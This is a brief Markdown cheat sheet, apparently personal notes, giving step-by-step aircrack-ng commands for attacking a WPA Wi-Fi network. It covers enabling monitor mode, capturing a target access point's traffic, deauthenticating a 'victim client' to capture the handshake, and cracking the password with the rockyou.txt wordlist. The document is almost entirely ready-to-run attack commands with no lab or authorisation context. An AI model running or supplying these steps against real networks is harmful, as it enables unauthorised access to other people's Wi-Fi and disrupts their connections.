# Wifi attack

### 1. Switch mode from managed to monitor

```bash
airmon-ng start wlan0
```

To check if monitor mode is on:
(Name of Wi-Fi card could be changed wlan0 --> wlan0mon)

```bash
iwconfig
```

### 2. Show all of the traffic 

```bash 
airodump-ng wlan0

Show network specific traffic:
airodump-ng -d "AP_MAC" -w "DUMPFILE_NAME" -c "CHANNEL" wlan0
```

Keep airodump open

### 3. Send de-auth packets to victim client 

```bash
aireplay-ng -0 10 -a "AP_MAC" -c "VICTIM_MAC" wlan0
```

Might take a few tries (repeat command if necessary)
If successful, airodump will show ```WPA handshake: "AP_MAC"``` --> close airodump

### 4. Crack the password
This method uses the rockyou.txt wordlist to crack the password by brute force

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt "DUMPFILE_NAME.cap"
```


Tip:
Unpack .gz file: gzip -d "filename.gz"

#Kali
